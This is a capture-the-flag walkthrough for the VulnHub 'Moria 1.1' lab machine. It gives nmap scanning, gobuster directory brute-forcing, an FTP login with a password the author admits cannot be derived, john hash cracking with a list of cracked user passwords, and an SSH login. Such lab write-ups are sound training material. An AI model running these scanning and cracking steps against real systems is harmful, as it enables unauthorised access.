::::::::::::::::::: page
# Moria: 1.1 {#moria-1.1 .title}

\

## 

## Moria: 1.1

- **[Moria: 1.1]{style="color:#5e5c64;"}** :-

<!-- -->

- Download the machine : <https://www.vulnhub.com/entry/moria-1,187/>

![](images/816-1.png)

- Extract the rar file .
- Open ovf file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#3f4043;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/816-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.192
:::

![](images/816-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.192
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.192  
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.192
:::

![](images/816-4.png)

1.  [Web Enumeration]{style="color:#3f4043;"} :

- IP visit in browser : <http://192.168.2.192>

![](images/816-5.png)

- Hint :

::: codebox
    Password : mellon
:::

<http://192.168.2.192/w/>

<http://192.168.2.192/w/h/i/s/p/e/r/the_abyss/>

![](images/816-6.png)

- Now run the gobuster for directory brute force :

::: codebox
    gobuster dir -u http://192.168.2.192/w/h/i/s/p/e/r/the_abyss/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
:::

![](images/816-7.png)

- Visit the hidden endpoint :
  <http://192.168.2.192/w/h/i/s/p/e/r/the_abyss/random.txt>

![](images/816-8.png)

- Hint : Users :

::: codebox
    Balin
    Oin
    Ori
    Fundin
    Nain
    Maeglin
    Telchar
    Thrain
    Dain
:::

1.  [FTP Enumeration]{style="color:#3f4043;"} :

- Login ftp :

::: codebox
    ftp 192.168.2.192
:::

![](images/816-9.png) Try to login anonymous but not login .

- Again login :

::: codebox
    Username : Balrog
    Password : Mellon69
:::

- 

::: codebox
    ftp 192.168.2.192
:::

![](images/816-10.png)

- Note : Password me 69 kha se aaya pta nhi exactly, but v1.1 me yhi
  works krta h --- enumeration se directly derive karna possible nahi
  tha .

<!-- -->

- After login navigate the directory :

::: codebox
    cd /var/www/html
:::

- Check list the file :

::: codebox
    ls
:::

![](images/816-11.png)

- Visit the hash directory in browser :
  <http://192.168.2.192/QlVraKW4fbIkXau9zkAPNGzviT3UKntl/>

![](images/816-12.png)

- View the source code :
  view-source:<http://192.168.2.192/QlVraKW4fbIkXau9zkAPNGzviT3UKntl/>

![](images/816-13.png)

1.  [Password Crack]{style="color:#3f4043;"} :

- Make a file and add the content :

::: codebox
    nano hashes.txt
:::

![](images/816-14.png)

- Run the john command to brute force the command :

::: codebox
    john --format=dynamic_6 hashes.txt --wordlist=/opt/rockyou.txt
:::

![](images/816-15.png)

- Found cracked password with username :

  Username   Password
  ---------- ----------
  Balin      flower
  Nain       warrior
  Ori        spanky
  Dain       abcdef
  Maeglin    fuckoff
  Thrain     darkness
  Telchar    magic
  Fundin     hunter2

1.  [SSH Access]{style="color:#3f4043;"} :

- Login ssh with Ori user :

::: codebox
    ssh Ori@192.168.2.192
:::

![](images/816-16.png)
:::::::::::::::::::
